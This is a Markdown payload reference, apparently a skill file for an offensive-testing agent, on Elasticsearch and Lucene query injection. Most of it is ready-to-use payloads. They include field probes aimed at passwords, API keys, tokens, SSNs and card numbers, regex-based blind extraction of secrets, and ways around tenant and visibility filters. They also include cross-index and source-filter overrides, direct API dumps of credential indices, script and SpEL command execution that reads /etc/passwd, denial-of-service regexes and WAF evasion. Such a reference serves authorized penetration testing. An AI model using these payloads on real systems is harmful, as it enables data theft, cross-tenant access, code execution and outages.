---
description: Lucene query_string injection, field enumeration (`_exists_`, wildcard fields), regex-based data extraction, cross-index access, source filtering override, direct API enumeration
skill: elasticsearch-injection
---

# Elasticsearch / Lucene Injection Payloads

Organized by attack phase: detection → field enumeration → data extraction → exploitation.

## Detection Payloads

### Confirm query_string Processing

```
# Boolean logic — if processed, AND/OR change result set
test AND 1=1
test AND 1=2
test OR impossible_term_xyz
* OR 1=1

# Wildcard — returns more results than specific term
*
te?t
test*

# Field-qualified — if syntax works, field:value notation is processed
title:test
_all:*
nonexistent_field:anything

# Grouping and precedence
(test) AND (something)
(test) OR (*:*)
```

### Confirm simple_query_string

```
# Prefix/suffix operators
+test -impossible
"exact phrase"
test | alternative
test + required
```

### Error-Triggering Payloads (for fingerprinting)

```
# Unbalanced syntax triggers parse errors that leak ES version/query type
test AND
test OR OR
field:[
"unclosed quote
/invalid[regex
{broken json}
```

---

## Field Enumeration Payloads

### Common Sensitive Fields

```
# Authentication/credential fields
password:*
password_hash:*
hashed_password:*
secret:*
api_key:*
token:*
access_token:*
refresh_token:*
session_token:*
private_key:*

# PII fields
ssn:*
social_security:*
credit_card:*
card_number:*
bank_account:*
phone:*
address:*
date_of_birth:*
dob:*

# Internal/admin fields
admin_notes:*
internal_notes:*
staff_notes:*
debug:*
internal_id:*
tenant_id:*
deleted:*
hidden:*
private:*

# Infrastructure fields
host:*
hostname:*
ip_address:*
server:*
database:*
connection_string:*
```

### Field Existence Probes

```
# _exists_ query (returns docs where field is non-null)
_exists_:password
_exists_:api_key
_exists_:secret
_exists_:ssn
_exists_:credit_card
_exists_:internal_notes
_exists_:admin
_exists_:role
_exists_:permissions

# Negated existence (find docs WITHOUT a field — may reveal schema)
NOT _exists_:verified
NOT _exists_:approved
```

### Wildcard Field Discovery

```
# Partial field name matching (ES query_string supports)
pass*:*
*key*:*
*secret*:*
*token*:*
*auth*:*
*admin*:*
*internal*:*
*private*:*
*hash*:*
*cred*:*
```

---

## Data Extraction Payloads

### Regex-Based Character Extraction

```
# First character probe (binary search)
fieldname:/^[a-m].*/
fieldname:/^[n-z].*/
fieldname:/^[a-g].*/
fieldname:/^[h-m].*/

# Numeric first character
fieldname:/^[0-9].*/
fieldname:/^[0-4].*/
fieldname:/^[5-9].*/

# Exact character probes
fieldname:/^a.*/
fieldname:/^b.*/
...
fieldname:/^z.*/

# Multi-character extraction (build progressively)
fieldname:/^se.*/
fieldname:/^sec.*/
fieldname:/^secr.*/
fieldname:/^secre.*/
fieldname:/^secret.*/
```

### Range-Based Extraction

```
# Numeric ranges
salary:[0 TO 50000]
salary:[50001 TO 100000]
salary:[100001 TO *]

# Date ranges
created_at:[2024-01-01 TO 2024-06-30]
last_login:[2024-01-01 TO *]

# String ranges (lexicographic)
email:[a TO m]
email:[n TO z]
username:[admin TO admin~]
```

### Boolean Extraction via Count Differential

```
# If search returns hit count, use to extract boolean fields
active:true            → N results
active:false           → M results
verified:true          → N results
is_admin:true          → N results (should be small number)
role:admin             → N results
role:superadmin        → N results
```

---

## Access Control Bypass Payloads

### Negating Application-Injected Filters

```
# If app adds "AND deleted:false" to queries
*) NOT deleted:false OR (*:*
* OR deleted:true

# If app adds "AND tenant_id:CURRENT" 
*) OR tenant_id:OTHER_TENANT OR (*:*
* NOT tenant_id:CURRENT

# If app adds "AND visibility:public"
*) OR visibility:private OR (*:*
* OR visibility:internal

# If app adds "AND status:active"
* OR status:deleted
* OR status:suspended
* OR status:archived
```

### Cross-Index Payloads

```
# If index is specified as a parameter
index=_all
index=*
index=users,credentials,audit_log
index=.kibana

# Index pattern wildcards
index=user*
index=*-2024*
index=.internal*
```

### Source Filtering Override

```
# As query parameters
_source=password,api_key,secret,token
_source_includes=*
_source_excludes=

# Stored fields override
stored_fields=*
stored_fields=password,_source

# Fields parameter (deprecated but may work on old versions)
fields=password,token,secret
```

---

## Direct API Payloads (if ES is exposed)

### Enumeration

```bash
# Cluster info
GET /_cluster/health
GET /_cluster/stats
GET /_nodes

# Index listing
GET /_cat/indices?v
GET /_aliases
GET /*/_mapping

# Document search
GET /_search?size=100
POST /_search {"query":{"match_all":{}},"_source":["*"]}

# Specific index
GET /users/_search?size=1000
GET /credentials/_search
GET /secrets/_search
GET /audit_log/_search
```

### Aggregation Extraction

```json
{"size": 0, "aggs": {"emails": {"terms": {"field": "email.keyword", "size": 10000}}}}
{"size": 0, "aggs": {"roles": {"terms": {"field": "role.keyword", "size": 100}}}}
{"size": 0, "aggs": {"password_lengths": {"stats": {"field": "password.length"}}}}
```

### Script Execution (ES < 5.x or script.inline enabled)

```json
{"query": {"bool": {"must": [{"script": {"script": {"source": "Runtime.getRuntime().exec('id')"}}}]}}}
{"script_fields": {"output": {"script": {"source": "java.lang.Runtime.getRuntime().exec('cat /etc/passwd')"}}}}
```

---

## DoS Payloads (use sparingly, with authorization)

```
# Expensive regex (catastrophic backtracking)
fieldname:/.*a{1000}.*/
fieldname:/(a+)+$/
fieldname:/([a-z]+)*!/

# Wildcard prefix (forces index scan)
fieldname:*test
fieldname:???????????????test

# Deep nested boolean (query explosion)
(((((((((((((test)))))))))))))
a OR b OR c OR d OR e OR f OR g OR h OR i OR j OR k OR l OR m OR n OR o OR p
```

---

## Framework-Specific Payloads

### Spring Data Elasticsearch

```
# SpEL injection (if user input reaches Spring EL context)
#{T(java.lang.Runtime).getRuntime().exec('id')}
```

### Python elasticsearch-dsl

```python
# If raw_query parameter is exposed
{"query_string": {"query": "* OR _exists_:password"}}
```

### Node.js @elastic/elasticsearch

```json
// If body is constructed from user input without sanitization
{"query": {"query_string": {"query": "USER_INPUT", "default_field": "*"}}}
// USER_INPUT = * OR _exists_:api_key
```

---

## Detection Bypass / WAF Evasion

```
# URL encoding of operators
%2B (for +)
%2D (for -)
%7C (for |)
%26%26 (for &&)
%7C%7C (for ||)

# Unicode variants
\u002A (for *)
\u003A (for :)

# Field name obfuscation
fiel\d:value (backslash in field name — ES may strip it)

# Nested query via JSON body (bypass URL-param WAF rules)
# If the search endpoint accepts POST with JSON body, move injection there
```
